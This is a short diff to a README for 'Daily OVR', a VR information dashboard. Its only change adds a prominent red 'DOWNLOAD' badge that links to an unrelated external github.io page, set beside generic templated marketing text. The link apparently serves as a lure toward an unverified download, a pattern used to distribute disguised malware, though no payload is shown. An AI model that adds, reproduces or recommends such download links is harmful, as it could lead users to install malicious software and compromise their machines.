@@ -30,6 +30,12 @@ Daily OVR displays a customizable information dashboard in VR showing the time, 
 
 Whether you're a newcomer or a veteran, Daily OVR provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Daily OVR](https://img.shields.io/badge/⬇_DOWNLOAD_Daily+OVR-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
